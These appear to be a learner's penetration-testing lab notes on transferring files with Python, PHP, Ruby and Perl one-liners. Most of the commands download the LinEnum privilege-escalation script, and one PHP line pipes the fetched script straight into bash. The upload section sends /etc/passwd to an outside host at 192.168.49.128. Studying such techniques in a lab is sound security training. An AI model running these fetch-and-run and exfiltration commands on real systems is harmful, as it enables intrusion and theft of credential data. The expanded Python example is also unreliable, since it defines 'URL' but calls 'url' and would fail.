

# Introduction :

In this Chapter we gonna learn more about transfering Files with programming languages Like #Python #PHP, #Perl and #Ruby .

# Python :

## Python 2 -Download :

```shell
Thibovski@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## Python 3 - Download :

```shell
Thibovski@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

# PHP :

- #PHP Provides multiple File Transfer methods.
- In this example we will use the PHP <mark style="background: #ADCCFFA6;">file_get_contents() </mark>Module to download contents from a website combined with the Module <mark style="background: #ADCCFFA6;">file_put_contents()</mark> Module to save the File into a directory.
- PHP can be rund from the command line using the option ```-r``` 

## PHP Download with File_get_contents() :

```shell
Thibovski@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

## PHP Download with Fopen():

An alternative to the #File_get_contents and #file_put_contents  is #fpopen to open URL, read and save the content.

```shell
Thibovski@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

## PHP Download a File and Pipe it to Bash :

Send the downloaded content to a pipe (Bash).

```shell
Thibovski@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

# Other Languages :

## Ruby - Download a File :

```shell
Thibovski@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Perl - Download a File :

```shell
Thibovski@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

# Upload Operations using Python3 :

The #Python_Upload Module allows you to send HTTP requests and upload a File into the giving Address or LocalHost.
More about Python Upload Module : [Python_Upload(GitHub)](https://github.com/Densaugeo/uploadserver)

## Starting the Python Upload Module :

```shell
Thibovski@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Uploading a File using a Python One-Liner :

```shell
Thibovski@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

To understand this Code we gonna write it in multiple Lines :

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

We can do the same thing with any other programming languages.

